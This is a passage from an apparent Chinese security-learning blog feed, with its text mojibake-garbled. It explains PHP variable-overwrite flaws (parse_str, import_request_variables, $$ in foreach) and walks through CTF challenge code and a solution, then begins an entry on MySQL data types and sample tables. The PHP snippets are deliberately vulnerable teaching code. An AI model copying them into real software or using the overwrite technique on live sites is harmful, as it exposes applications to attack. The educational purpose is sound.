<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a = <span class="string">&#x27;init&#x27;</span>;</span><br><span class="line">parse_str($SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118145544.png" alt=""></p>
<p>å†æ¥çœ‹ä¸€é“CTFçš„é¢˜ç›®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	$a = <span class="string">&quot;www.ca0y1h.top&quot;</span>;</span><br><span class="line">	$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	@parse_str($id);</span><br><span class="line">	<span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;so easy!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯PHPå¼±ç±»å‹å’Œå˜é‡è¦†ç›–ç»“åˆçš„é¢˜ç›®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118151825.png" alt=""></p>
<h2 id="mb-parse-str-å˜é‡è¦†ç›–">mb_parse_str()å˜é‡è¦†ç›–</h2>
<p>mb_parse_str()å‡½æ•°ç”¨äºè§£æGET/POST/COOKIEæ•°æ®å¹¶è®¾ç½®å…¨å±€å˜é‡ï¼Œå’Œparse_str()ç±»ä¼¼ã€‚</p>
<h2 id="import-request-variables-å˜é‡è¦†ç›–">import_request_variables()å˜é‡è¦†ç›–</h2>
<blockquote>
<p>æ”¯æŒç‰ˆæœ¬ï¼šPHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p>
</blockquote>
<p>import_request_variables()å‡½æ•°å°†GETã€POSTã€Cookiesä¸­çš„å˜é‡å¯¼å…¥åˆ°å…¨å±€ã€‚</p>
<p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> import_request_variables (<span class="keyword">string</span> $types [, <span class="keyword">string</span> $prefix])</span><br></pre></td></tr></table></figure>
<p><code>$type</code>ä»£è¡¨è¦æ³¨å†Œçš„å˜é‡ï¼ŒGä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIEï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æ³¨å†Œå˜é‡çš„å‰ç¼€ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™å°†è¦†ç›–å…¨å±€å˜é‡ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">import_request_variables(<span class="string">&#x27;P&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($auth === <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;public&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118150713.png" alt=""></p>
<h2 id="å¯¼è‡´çš„å˜é‡è¦†ç›–"><code>$$</code>å¯¼è‡´çš„å˜é‡è¦†ç›–</h2>
<p><code>$$</code>å³å¯å˜å˜é‡ï¼Œä¸€ä¸ªå¯å˜å˜é‡è·å–äº†ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºè¿™ä¸ªå¯å˜å˜é‡çš„å˜é‡åã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	$x = <span class="string">&quot;ca01h&quot;</span>;</span><br><span class="line">	$$x = <span class="number">666</span>;</span><br><span class="line">	<span class="keyword">echo</span> $x.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $$x.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $ca01h;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å…¶å®ä¹Ÿå°±ç­‰ä»·äº<code>$($x)</code>ï¼Œè¾“å‡ºä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h</span><br><span class="line">666</span><br><span class="line">666</span><br></pre></td></tr></table></figure>
<p><code>$$</code>å¯¼è‡´çš„å˜é‡è¦†ç›–é—®é¢˜åœ¨CTFä»£ç å®¡è®¡é¢˜ç›®ä¸­ç»å¸¸åœ¨foreachä¸­å‡ºç°ï¼Œå¦‚ä»¥ä¸‹çš„ç¤ºä¾‹ä»£ç ï¼Œä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($id === <span class="string">&quot;ca01h&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä»¥GETã€POSTæˆ–COOKIEéƒ½èƒ½è§¦å‘å˜é‡è¦†ç›–æ¼æ´ï¼Œä¼ å…¥id=ca01håï¼Œåœ¨foreachè¯­å¥ä¸­ï¼Œ<code>$_key</code>ä¸ºidï¼Œ<code>$_value</code>ä¸ºca01hï¼Œè¿›è€Œ<code>$$_key</code>ä¸º$idï¼Œä»è€Œå®ç°äº†å˜é‡è¦†ç›–ã€‚</p>
<p>æœ€åä»¥ä¸€é“CTFé¢˜ä¸ºæ­¤æ–‡ç« ç»“å°¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$_403 = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line">$_200 = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;BugsBunnyCTF is here :pâ€¦&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">&quot;flag&quot;</span>]) )&#123;</span><br><span class="line">	<span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	$$key = $$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">&quot;flag&quot;</span>] !== $flag )	&#123;</span><br><span class="line">	<span class="keyword">die</span>($_403);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. $flag . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">die</span>($_200);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰3ä¸ªifè¯­å¥å’Œ2ä¸ªforeachè¯­å¥ã€‚</p>
<p>åœ¨ifè¯­å¥ä¸­ï¼Œç¬¬ä¸€ä¸ªéœ€è¦ä½ æ˜¯é€šè¿‡POSTæ–¹å¼è¿›è¡Œè¯·æ±‚ï¼Œç¬¬äºŒä¸ªæ˜¯éœ€è¦POSTä¸€ä¸ªflagå‚æ•°è¿‡å»ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ¯”è¾ƒflagå‚æ•°å’ŒåŒ…å«è¿›æ¥çš„çœŸæ­£çš„flagæ˜¯å¦ç›¸ç­‰ã€‚</p>
<p>åœ¨foreachè¯­å¥ä¸­ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¯ä»¥å°†GETçš„å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œç¬¬äºŒä¸ªæ˜¯å°†POSTçš„å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä½†ä¸¤ä¸ªè¯­å¥çš„å¤„ç†æ˜¯æœ‰ç‚¹åŒºåˆ«çš„å³ä¸€ä¸ªé”®å€¼ä¸º$$valueå¦ä¸€ä¸ªä¸º$valueã€‚</p>
<p>è¿™é‡Œæ•´ç†ä¸€ä¸‹æ€è·¯ï¼š</p>
<ol>
<li>å› ä¸ºPOSTçš„å‚æ•°å¿…é¡»ä¸ºflagï¼Œåˆ™ç¬¬äºŒä¸ªforeachè¯­å¥çš„<code>$key</code>ä¸ºflagï¼Œè¿›è€Œ<code>$$key</code>ä¸º<code>$flag</code>ï¼Œä»è€Œå¾—åˆ°<code>$flag</code>çš„å€¼ä¸ºPOSTä¼ é€’çš„flagå‚æ•°çš„å€¼ã€‚</li>
<li>åˆå› ä¸ºç¬¬äºŒä¸ªforeachè¯­å¥ä¿®æ”¹äº†<code>$flag</code>åŸæ¥çš„å€¼ä¸ºPOSTä¼ é€’çš„flagå‚æ•°çš„å€¼ï¼Œå› è€Œæœ€åä¸€ä¸ªifè¯­å¥çš„æ¡ä»¶æ˜¯æ’ä¸æˆç«‹çš„ï¼Œåœ¨å…¶åçš„elseä»£ç å—é€»è¾‘ä¸­echoè¾“å‡ºå‡ºæ¥çš„åªèƒ½æ˜¯ä¿®æ”¹äº†çš„<code>$flag</code>çš„å€¼å³POSTä¼ é€’çš„flagå‚æ•°çš„å€¼è€ŒéåŸæœ¬çš„<code>$flag</code>çš„å€¼ã€æ¥ç€è¾“å‡º<code>$_200</code>å˜é‡çš„å€¼ã€‚</li>
<li>è¦æƒ³è¾“å‡ºåŸæœ¬çš„<code>$flag</code>çš„å€¼ï¼Œæˆ‘ä»¬éœ€è¦å°†åŸæœ¬çš„<code>$flag</code>è¦†ç›–<code>$_200</code>å˜é‡ï¼Œå› æ­¤åœ¨ç¬¬ä¸€ä¸ª<code>foreach</code>è¯­å¥ä¸­é€šè¿‡GETè¾“å…¥<code>_200=flag</code>ï¼Œä»è€Œå¾—åˆ°çš„<code>$$key</code>ä¸º<code>$_200</code> ä»¥åŠ<code>$$value</code>ä¸º<code>$flag</code>ï¼Œä»è€Œå®ç°åœ¨ä¿®æ”¹<code>$flag</code>çš„å€¼ä¹‹å‰å°†å…¶è¦†ç›–åˆ°<code>$_200</code>å˜é‡ä¸­ã€‚</li>
</ol>
<p>éªŒè¯ç»“æœï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118161214.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<ul>
<li>ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹</li>
<li><a href="https://www.mi1k7ea.com/2019/06/20/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">PHPå˜é‡è¦†ç›–æ¼æ´å°å°ç»“â€”â€”mi1k7ea</a></li>
<li><a href="https://y4er.com/post/variable-coverage/">PHPå˜é‡è¦†ç›–æ€»ç»“â€”â€”Y4er</a></li>
<li><a href="https://p0sec.net/index.php/archives/35/">PHPå˜é‡è¦†ç›–æ€»ç»“â€”â€”p0sec</a></li>
</ul>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>å˜é‡è¦†ç›–</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹MySQLåŸºæœ¬æ“ä½œ</title>
    <url>/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹MySQLåŸºæœ¬æ“ä½œ">Webå®‰å…¨å­¦ä¹ ä¹‹MySQLåŸºæœ¬æ“ä½œ</h1>
<blockquote>
<p>ä¸»è¦ä»¥ã€ŠMySQLå¿…çŸ¥å¿…ä¼šã€‹ï¼ˆã€ŠMySQl Crash Courseã€‹ï¼‰ä¸ºå‚è€ƒ</p>
</blockquote>
<h2 id="ä»»åŠ¡ç›®æ ‡">ä»»åŠ¡ç›®æ ‡</h2>
<ul>
<li>ä»€ä¹ˆæ˜¯å…³ç³»å‹å’Œâ¾®å…³ç³»å‹æ•°æ®åº“</li>
<li>é€‰æ‹©â¼€ç§å…³ç³»å‹æ•°æ®åº“è¿›â¾å­¦ä¹ </li>
<li>å­¦ä¹ æ•°æ®åº“ä¸­çš„å­—æ®µç±»å‹å¹¶åˆ›å»ºåº“å’Œâ½¤â¼¾è¡¨ï¼Œéœ€è¦åŒ…å«æ‰€æœ‰å­—æ®µç±»å‹</li>
<li>å­¦ä¹ æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥ï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹</li>
</ul>
<a id="more"></a>
<h2 id="0x01-SQL-NoSQL">0x01 SQL&amp;NoSQL</h2>
<ol>
<li>
<h5 id="å…³ç³»å‹æ•°æ®åº“">å…³ç³»å‹æ•°æ®åº“</h5>
<ul>
<li>å…³ç³»å‹æ•°æ®åº“æ˜¯ä»¥å…³ç³»æ¨¡å‹æ¥åˆ›å»ºçš„æ•°æ®åº“ã€‚</li>
<li>å…³ç³»æ¨¡å‹å°±æ˜¯æŒ‡äºŒç»´è¡¨æ ¼æ¨¡å‹ã€‚</li>
<li>ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“å°±æ˜¯ç”±äºŒç»´è¡¨åŠå…¶ä¹‹é—´çš„è”ç³»ç»„æˆçš„ä¸€ä¸ªæ•°æ®ç»„ç»‡ã€‚</li>
<li>å¸¸è§çš„å…³ç³»å‹æ•°æ®åº“æœ‰ï¼š<br>
Mysqlã€Oracleã€PostgreSQLã€SQLServerã€MicrosoftAccess</li>
</ul>
</li>
<li>
<h5 id="éå…³ç³»å‹æ•°æ®åº“">éå…³ç³»å‹æ•°æ®åº“</h5>
<ul>
<li>éå…³ç³»å‹æ•°æ®åº“æ˜¯ä»¥éå…³ç³»æ¨¡å‹æ¥åˆ›å»ºçš„æ•°æ®åº“ã€‚</li>
<li>éå…³ç³»æ¨¡å‹æœ‰åˆ—æ¨¡å‹ã€é”®å€¼å¯¹æ¨¡å‹ã€æ–‡æ¡£ç±»æ¨¡å‹ã€‚</li>
<li>å¸¸è§çš„å…³ç³»å‹æ•°æ®åº“æœ‰ï¼š<br>
MongoDBã€Redisã€MemcacheDBã€HBase</li>
</ul>
</li>
</ol>
<h2 id="0x02-æ•°æ®ç±»å‹">0x02 æ•°æ®ç±»å‹</h2>
<table>
<thead>
<tr>
<th style="text-align:left">åç§°</th>
<th style="text-align:left">ç±»å‹</th>
<th style="text-align:left">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">INT</td>
<td style="text-align:left">æ•´å‹</td>
<td style="text-align:left">4å­—èŠ‚æ•´æ•°ç±»å‹ï¼ŒèŒƒå›´çº¦+/-21äº¿</td>
</tr>
<tr>
<td style="text-align:left">BIGINT</td>
<td style="text-align:left">é•¿æ•´å‹</td>
<td style="text-align:left">8å­—èŠ‚æ•´æ•°ç±»å‹ï¼ŒèŒƒå›´çº¦+/-922äº¿äº¿</td>
</tr>
<tr>
<td style="text-align:left">REAL</td>
<td style="text-align:left">æµ®ç‚¹å‹</td>
<td style="text-align:left">4å­—èŠ‚æµ®ç‚¹æ•°ï¼ŒèŒƒå›´çº¦+/-1038</td>
</tr>
<tr>
<td style="text-align:left">DOUBLE</td>
<td style="text-align:left">æµ®ç‚¹å‹</td>
<td style="text-align:left">8å­—èŠ‚æµ®ç‚¹æ•°ï¼ŒèŒƒå›´çº¦+/-10308</td>
</tr>
<tr>
<td style="text-align:left">DECIMAL(M,N)</td>
<td style="text-align:left">é«˜ç²¾åº¦å°æ•°</td>
<td style="text-align:left">ç”±ç”¨æˆ·æŒ‡å®šç²¾åº¦çš„å°æ•°ï¼Œä¾‹å¦‚ï¼ŒDECIMAL(20,10)è¡¨ç¤ºä¸€å…±20ä½ï¼Œå…¶ä¸­å°æ•°10ä½ï¼Œé€šå¸¸ç”¨äºè´¢åŠ¡è®¡ç®—</td>
</tr>
<tr>
<td style="text-align:left">CHAR(N)</td>
<td style="text-align:left">å®šé•¿å­—ç¬¦ä¸²</td>
<td style="text-align:left">å­˜å‚¨æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼ŒCHAR(100)æ€»æ˜¯å­˜å‚¨100ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left">VARCHAR(N)</td>
<td style="text-align:left">å˜é•¿å­—ç¬¦ä¸²</td>
<td style="text-align:left">å­˜å‚¨å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼ŒVARCHAR(100)å¯ä»¥å­˜å‚¨0~100ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left">BOOLEAN</td>
<td style="text-align:left">å¸ƒå°”ç±»å‹</td>
<td style="text-align:left">å­˜å‚¨Trueæˆ–è€…False</td>
</tr>
<tr>
<td style="text-align:left">DATE</td>
<td style="text-align:left">æ—¥æœŸç±»å‹</td>
<td style="text-align:left">å­˜å‚¨æ—¥æœŸï¼Œä¾‹å¦‚ï¼Œ2018-06-22</td>
</tr>
<tr>
<td style="text-align:left">TIME</td>
<td style="text-align:left">æ—¶é—´ç±»å‹</td>
<td style="text-align:left">å­˜å‚¨æ—¶é—´ï¼Œä¾‹å¦‚ï¼Œ12:20:59</td>
</tr>
<tr>
<td style="text-align:left">DATETIME</td>
<td style="text-align:left">æ—¥æœŸå’Œæ—¶é—´ç±»å‹</td>
<td style="text-align:left">å­˜å‚¨æ—¥æœŸ+æ—¶é—´ï¼Œä¾‹å¦‚ï¼Œ2018-06-22 12:20:59</td>
</tr>
</tbody>
</table>
<h2 id="0x03-æ ·ä¾‹è¡¨è®¾è®¡">0x03 æ ·ä¾‹è¡¨è®¾è®¡</h2>
<ul>
<li>
<p>vendorsè¡¨</p>
<p>vendorsè¡¨å­˜å‚¨é”€å”®äº§å“çš„ä¾›åº”å•†ã€‚æ¯ä¸ªä¾›åº”å•†åœ¨è¿™ä¸ªè¡¨ä¸­æœ‰ä¸€ä¸ªè®°å½•ï¼Œä¾›åº”å•†IDï¼ˆvend_idï¼‰åˆ—ç”¨æ¥åŒ¹é…äº§å“å’Œä¾›åº”å•†ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åˆ—</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">vend_id</td>
<td style="text-align:center">ä¾›åº”å•†ID</td>
</tr>
<tr>
<td style="text-align:center">vend_name</td>
<td style="text-align:center">ä¾›åº”å•†å</td>
</tr>
<tr>
<td style="text-align:center">vend_address</td>
<td style="text-align:center">ä¾›åº”å•†çš„åœ°å€</td>
</tr>
<tr>
<td style="text-align:center">vend_city</td>
<td style="text-align:center">ä¾›åº”å•†çš„åŸå¸‚</td>
</tr>
<tr>
<td style="text-align:center">vend_state</td>
<td style="text-align:center">ä¾›åº”å•†çš„å·</td>
</tr>
<tr>
<td style="text-align:center">vend_zip</td>
<td style="text-align:center">ä¾›åº”å•†çš„é‚®æ”¿ç¼–ç </td>
</tr>
<tr>
<td style="text-align:center">vend_country</td>
<td style="text-align:center">ä¾›åº”å•†çš„å›½å®¶</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>productsè¡¨</p>
<p>productsè¡¨åŒ…å«äº§å“ç›®å½•ï¼Œæ¯è¡Œä¸€ä¸ªäº§å“ã€‚æ¯ä¸ªäº§å“æœ‰å”¯ä¸€çš„IDï¼ˆprod_idåˆ—ï¼‰ï¼Œé€šè¿‡vend_idï¼ˆä¾›åº”å•†çš„å”¯ä¸€IDï¼‰å…³è”åˆ°å®ƒçš„ä¾›åº”å•†ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åˆ—</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">prod_id</td>
<td style="text-align:center">äº§å“ID</td>
</tr>
<tr>
<td style="text-align:center">vend_id</td>
<td style="text-align:center">äº§å“ä¾›åº”å•†ID</td>
</tr>
<tr>
<td style="text-align:center">prod_name</td>
<td style="text-align:center">äº§å“å</td>
</tr>
<tr>
<td style="text-align:center">prod_price</td>
<td style="text-align:center">äº§å“ä»·æ ¼</td>
</tr>
<tr>
<td style="text-align:center">prod_desc</td>
<td style="text-align:center">äº§å“æè¿°</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>customersè¡¨</p>
<p>customersè¡¨å­˜å‚¨æ‰€æœ‰é¡¾å®¢çš„ä¿¡æ¯ã€‚æ¯ä¸ªé¡¾å®¢æœ‰å”¯ä¸€çš„IDï¼ˆcust_idåˆ—ï¼‰ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åˆ—</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">cust_id</td>
<td style="text-align:center">é¡¾å®¢ID</td>
</tr>
<tr>
<td style="text-align:center">cust_name</td>
<td style="text-align:center">é¡¾å®¢å§“å</td>
</tr>
<tr>
<td style="text-align:center">cust_address</td>
<td style="text-align:center">é¡¾å®¢çš„åœ°å€</td>
</tr>
<tr>
<td style="text-align:center">cust_city</td>
<td style="text-align:center">é¡¾å®¢çš„åŸå¸‚</td>
</tr>
<tr>
<td style="text-align:center">cust_state</td>
<td style="text-align:center">é¡¾å®¢çš„å·</td>
</tr>
<tr>
<td style="text-align:center">cust_zip</td>
<td style="text-align:center">é¡¾å®¢çš„é‚®æ”¿ç¼–ç </td>
</tr>
<tr>
<td style="text-align:center">cust_country</td>
<td style="text-align:center">é¡¾å®¢çš„å›½å®¶</td>
</tr>
<tr>
<td style="text-align:center">cust_contact</td>
<td style="text-align:center">é¡¾å®¢çš„è”ç³»æ–¹å¼</td>
</tr>
<tr>
<td style="text-align:center">cust_email</td>
<td style="text-align:center">é¡¾å®¢çš„é‚®ç®±</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>ordersè¡¨</p>
<p>ordersè¡¨å­˜å‚¨é¡¾å®¢è®¢å•ï¼ˆä½†ä¸æ˜¯è®¢å•ç»†èŠ‚ï¼‰ã€‚æ¯ä¸ªè®¢å•å”¯ä¸€åœ°ç¼–å·ï¼ˆorder_numåˆ—ï¼‰ã€‚è®¢å•ç”¨cust_idåˆ—ï¼ˆå®ƒå…³è”åˆ°customerè¡¨çš„é¡¾å®¢å”¯ä¸€IDï¼‰ä¸ç›¸åº”çš„é¡¾å®¢å…³è”ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åˆ—</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">order_num</td>
<td style="text-align:center">å”¯ä¸€è®¢å•å·</td>
</tr>
<tr>
<td style="text-align:center">order_date</td>
<td style="text-align:center">è®¢å•æ—¥æœŸ</td>
</tr>
<tr>
<td style="text-align:center">cust_id</td>
<td style="text-align:center">è®¢å•é¡¾å®¢ID</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>orderitemsè¡¨</p>
<p>orderitemsè¡¨å­˜å‚¨æ¯ä¸ªè®¢å•ä¸­çš„å®é™…ç‰©å“ï¼Œæ¯ä¸ªè®¢å•çš„æ¯ä¸ªç‰©å“å ä¸€è¡Œã€‚å¯¹ordersä¸­çš„æ¯ä¸€è¡Œï¼Œorderitemsä¸­æœ‰ä¸€è¡Œæˆ–å¤šè¡Œã€‚æ¯ä¸ªè®¢å•ç‰©å“ç”±è®¢å•å·åŠ è®¢å•ç‰©å“ï¼ˆç¬¬ä¸€ä¸ªç‰©å“ã€ç¬¬äºŒä¸ªç‰©å“ç­‰ï¼‰å”¯ä¸€æ ‡è¯†ã€‚è®¢å•ç‰©å“é€šè¿‡order_numåˆ—ï¼ˆå…³è”åˆ°ordersä¸­è®¢å•çš„å”¯ä¸€IDï¼‰ä¸å®ƒä»¬ç›¸åº”çš„è®¢å•ç›¸å…³è”ã€‚æ­¤å¤–ï¼Œæ¯ä¸ªè®¢å•é¡¹åŒ…å«è®¢å•ç‰©å“çš„äº§å“IDï¼ˆå®ƒå…³è”ç‰©å“åˆ°productsè¡¨ï¼‰</p>
<table>
<thead>
<tr>
<th style="text-align:center">åˆ—</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">order_num</td>
<td style="text-align:center">è®¢å•å·ï¼ˆå…³è”åˆ°ordersè¡¨çš„order_numï¼‰</td>
</tr>
<tr>
<td style="text-align:center">order_item</td>
<td style="text-align:center">è®¢å•ç‰©å“å·ï¼ˆåœ¨æŸä¸ªè®¢å•ä¸­çš„é¡ºåºï¼‰</td>
</tr>
<tr>
<td style="text-align:center">prod_id</td>
<td style="text-align:center">äº§å“IDï¼ˆå…³è”åˆ°productsè¡¨çš„prod_idï¼‰</td>
</tr>
<tr>
<td style="text-align:center">quantity</td>
<td style="text-align:center">ç‰©å“æ•°é‡</td>
</tr>
<tr>
<td style="text-align:center">item_price</td>
<td style="text-align:center">ç‰©å“ä»·æ ¼</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>productnotesè¡¨</p>
<p>productnotesè¡¨å­˜å‚¨ä¸ç‰¹å®šäº§å“æœ‰å…³çš„æ³¨é‡Šã€‚å¹¶éæ‰€æœ‰äº§å“éƒ½æœ‰ç›¸å…³çš„æ³¨é‡Šï¼Œè€Œæœ‰çš„äº§å“å¯èƒ½æœ‰è®¸å¤šç›¸å…³çš„æ³¨é‡Šã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åˆ—</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">note_id</td>
<td style="text-align:center">æ³¨é‡ŠID</td>
</tr>
<tr>
<td style="text-align:center">prod_id</td>
<td style="text-align:center">äº§å“ID</td>
</tr>
<tr>
<td style="text-align:center">note_date</td>
<td style="text-align:center">å¢åŠ æ³¨é‡Šçš„æ—¥æœŸ</td>
</tr>
<tr>
<td style="text-align:center">note_text</td>
<td style="text-align:center">æ³¨é‡Šçš„å†…å®¹</td>
</tr>
</tbody>
</table>
</li>
</ul>
